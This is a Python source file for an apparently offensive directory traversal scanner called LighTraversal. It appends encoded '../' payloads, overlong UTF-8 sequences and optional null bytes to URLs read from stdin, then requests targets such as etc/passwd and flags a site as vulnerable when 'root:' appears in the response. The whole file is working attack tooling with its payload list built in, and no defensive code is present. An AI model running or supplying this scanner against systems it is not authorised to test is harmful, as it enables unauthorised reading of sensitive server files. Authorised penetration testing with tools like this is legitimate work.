import sys
import requests

class bcolors:
	OK = '\033[92m'
	FAIL = '\033[91m'
	RESET = '\033[0m'

def UrlBuilder(params, payload, file):
	for key, value in params.items():
		params[key]=payload+file
	url = '&'.join('{}={}'.format(key, value) for key, value in params.items())
	return url

def Verif(response, url):
	if 'root:' in response:
		print(bcolors.FAIL+'[VULN]'+url+bcolors.RESET)
	else:
		print(bcolors.OK+'[NOT VULN]'+url+bcolors.RESET)
	

def main():
	payloads = ["/","../../../","....//....//....//","..///////..///////..///////","..%5c..%5c..%5c","..%253f..%253f..%253f","..%c0%af..%c0%af..%c0%af","%252e%252e%252f%252e%252e%252f%252e%252e%252f","/var/www/images/../../../"]
	files = ["etc/passwd","etc//passwd","etc///////passwd","etc%5cpasswd","etc%253fpasswd","etc%c0%afpasswd","etc%252fpasswd"]
	nullbyte = []

	if len(sys.argv) > 2:
		print(bcolors.FAIL+"[!] "+bcolors.RESET+"too much arguments given.")
		print(bcolors.OK+"[*] "+bcolors.RESET+"usage: echo 'https://target.com/...' | python3 LighTraversal.py [--null-byte]") 
		print(bcolors.OK+"[*] "+bcolors.RESET+"usage: cat urls.txt | python3 LighTraversal.py [--null-byte]") 
		print(bcolors.OK+"[*] "+bcolors.RESET+"usage: other tool | python3 LighTraversal.py [--null-byte]") 
		sys.exit(1)

	if '--null-byte' in sys.argv:
		for file in files:
			file = file+'%00'
			nullbyte.append(file)

	for line in sys.stdin:
		try:
			if not '=' in line:
				for payload in payloads:
					if '--null-byte' in sys.argv:
						for file in nullbyte:
							url=line.strip()+payload+file
							rq = requests.get(url)
							Verif(rq.text, url)
					else:
						for file in files:
							url = line.strip()+payload+file
							rq = requests.get(url)
							Verif(rq.text, url)
			else:
				params = dict(x.split('=') for x in line.split('&'))
				for payload in payloads:
					if '--null-byte' in sys.argv:
						for file in nullbyte:
							url = UrlBuilder(params, payload, file)
							rq = requests.get(url)
							Verif(rq.text, url)
					else:
						for file in files:
							url = UrlBuilder(params, payload, file)
							rq = requests.get(url)
							Verif(rq.text, url)
		except KeyboardInterrupt:
			sys.exit(1)
		except:
			pass
			
if __name__ == '__main__':
	try:
		main()
	except Exception as e:
		print("A problem has occured.")
		print("Error info:")
		print(e)
